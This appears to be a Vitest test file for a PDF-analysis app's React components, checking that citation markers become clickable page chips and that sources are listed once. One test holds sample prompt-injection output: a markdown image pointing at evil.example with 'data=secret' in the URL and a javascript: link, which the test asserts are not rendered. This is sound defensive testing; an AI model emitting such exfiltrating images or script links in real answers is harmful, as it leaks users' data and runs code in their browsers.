// @vitest-environment jsdom
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import type { Citation } from '@pdf-analyzer/shared';
import { AnswerContent, SourceList } from './AnswerContent';

const cite = (index: number, page: number): Citation => ({
  index,
  documentId: 'doc',
  documentName: 'report.pdf',
  page,
  snippet: `text from page ${page}`,
  score: 0.8
});
const citations = [cite(1, 2), cite(2, 5), cite(3, 5)];

describe('AnswerContent', () => {
  it('turns [n] markers, lists and ranges into page chips that jump to the source', async () => {
    const onCite = vi.fn();
    render(
      <AnswerContent content="Fredville [1]. Prices rose [2, 3] and [1-2]." citations={citations} onCite={onCite} />
    );

    const chips = screen.getAllByRole('button');
    expect(chips.map((c) => c.textContent)).toEqual(['p.2', 'p.5', 'p.5', 'p.2', 'p.5']);
    expect(chips[0]).toHaveAttribute('title', 'report.pdf, page 2');

    await userEvent.click(chips[1]);
    expect(onCite).toHaveBeenCalledWith(citations[1]);
  });

  it('leaves numbers that are not known sources as plain text', () => {
    render(<AnswerContent content="See footnote [9]." citations={citations} onCite={() => {}} />);
    expect(screen.queryByRole('button')).toBeNull();
    expect(screen.getByText('See footnote [9].')).toBeInTheDocument();
  });

  it('never loads images or unsafe links written by the model (prompt-injection output)', () => {
    const { container } = render(
      <AnswerContent
        content={
          '![leak](https://evil.example/x.png?data=secret) [click](javascript:alert(1)) [docs](https://example.com)'
        }
        citations={[]}
        onCite={() => {}}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container).toHaveTextContent('leak'); // alt text only
    expect(screen.queryByRole('link', { name: 'click' })).toBeNull();
    const safe = screen.getByRole('link', { name: 'docs' });
    expect(safe).toHaveAttribute('href', 'https://example.com');
    expect(safe).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });
});

describe('SourceList', () => {
  it('lists each cited page once, in order', () => {
    render(<SourceList citations={[cite(3, 5), cite(1, 2), cite(2, 5)]} onCite={() => {}} showDocument={false} />);
    expect(screen.getAllByRole('button').map((b) => b.textContent)).toEqual(['Page 2', 'Page 5']);
  });
});
